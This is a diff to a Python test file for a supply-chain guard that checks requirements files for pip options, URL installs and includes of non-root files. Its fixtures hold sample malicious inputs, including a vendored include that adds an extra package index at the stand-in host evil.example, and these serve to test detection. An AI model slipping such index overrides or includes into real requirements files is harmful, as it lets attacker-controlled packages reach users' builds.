@@ -415,11 +415,23 @@ def test_scalar_flow_lists_and_expressions_stay_accepted():
     ('--find-links=https://example.org/wheels', 'pip_option_in_requirements:--find-links=https://example.org/wheels'),
     ('-e .', 'pip_option_in_requirements:-e'),
     ('--trusted-host example.org', 'pip_option_in_requirements:--trusted-host'),
-    ('-r https://example.org/req.txt', 'pip_option_in_requirements:-r'),
+    ('-r https://example.org/req.txt', 'pip_include_not_root_requirements:https://example.org/req.txt'),
     ('git+https://github.com/x/y', 'url_in_requirements:'),
     ('probe @ https://example.org/probe-1.0-py3-none-any.whl', 'url_in_requirements:'),
     ('probe@file:///tmp/probe.whl', 'url_in_requirements:'),
     ('aiohttp>=3.10 --global-option=x', 'pip_option_in_requirements:--global-option'),
+    # Residual path reported by RUGGER 02 (T-0021, point 2): includes and local paths.
+    ('-r vendor/extra.txt', 'pip_include_not_root_requirements:vendor/extra.txt'),
+    ('-c ../constraints.txt', 'pip_include_not_root_requirements:../constraints.txt'),
+    ('--requirement=extra.txt', 'pip_include_not_root_requirements:extra.txt'),
+    ('./vendor/pkg', 'not_a_pypi_requirement:'),
+    ('vendor/pkg', 'not_a_pypi_requirement:'),
+    ('.', 'not_a_pypi_requirement:'),
+    ('probe-1.0-py3-none-any.whl', 'not_a_pypi_requirement:'),
+    ('probe.tar.gz', 'not_a_pypi_requirement:'),
+    ('probe-1.0.zip', 'not_a_pypi_requirement:'),
+    ('probe-1.0.tar.xz', 'not_a_pypi_requirement:'),
+    ('~/pkg', 'not_a_pypi_requirement:'),
 ])
 def test_requirements_may_only_name_pypi_packages(line, violation):
     violations = guard.requirements_violations('# header\naiohttp>=3.10,<4\n%s\n' % line)
@@ -427,7 +439,7 @@ def test_requirements_may_only_name_pypi_packages(line, violation):
 
 
 def test_plain_requirements_includes_hashes_and_markers_are_accepted():
-    text = ('# comment\n-r requirements.txt\n-c constraints.txt\nstreamlit>=1.39,<2\n'
+    text = ('# comment\n-r requirements.txt\n-c requirements-constraints.txt\nstreamlit>=1.39,<2\n'
             'pandas==2.3.3 --hash=sha256:%s\n' % ('a' * 64) +
             'numpy==2.3.4; python_version >= "3.11"  # pinned\ncryptography[ssh]>=46,<47\n')
     assert guard.requirements_violations(text) == []
@@ -536,3 +548,23 @@ def test_requirements_mutation_is_detected_by_the_cli(tmp_path):
     target.write_text(target.read_text(encoding='utf-8') + '--extra-index-url https://pypi.org.example/simple\n',
                       encoding='utf-8')
     assert guard.main([str(workflows)]) == 1
+
+
+def test_requirements_include_outside_the_root_files_is_detected_by_the_cli(tmp_path):
+    """RUGGER 02 end-to-end case (T-0021): a root file includes a non-root file holding another index."""
+    workflows = tmp_path / '.github' / 'workflows'
+    workflows.mkdir(parents=True)
+    for path in WORKFLOWS.iterdir():
+        if path.suffix in ('.yml', '.yaml'):
+            (workflows / path.name).write_text(path.read_text(encoding='utf-8'), encoding='utf-8')
+    for path in ROOT.glob('requirements*.txt'):
+        (tmp_path / path.name).write_text(path.read_text(encoding='utf-8'), encoding='utf-8')
+    (tmp_path / 'vendor').mkdir()
+    (tmp_path / 'vendor' / 'extra.txt').write_text(
+        '--extra-index-url https://evil.example/simple\nprobe==1.0\n', encoding='utf-8')
+    assert guard.main([str(workflows)]) == 0
+    live = tmp_path / 'requirements-live.txt'
+    live.write_text(live.read_text(encoding='utf-8') + '-r vendor/extra.txt\n', encoding='utf-8')
+    assert guard.main([str(workflows)]) == 1
+    assert guard.scan_requirements(tmp_path)['requirements-live.txt'] == [
+        'pip_include_not_root_requirements:vendor/extra.txt']
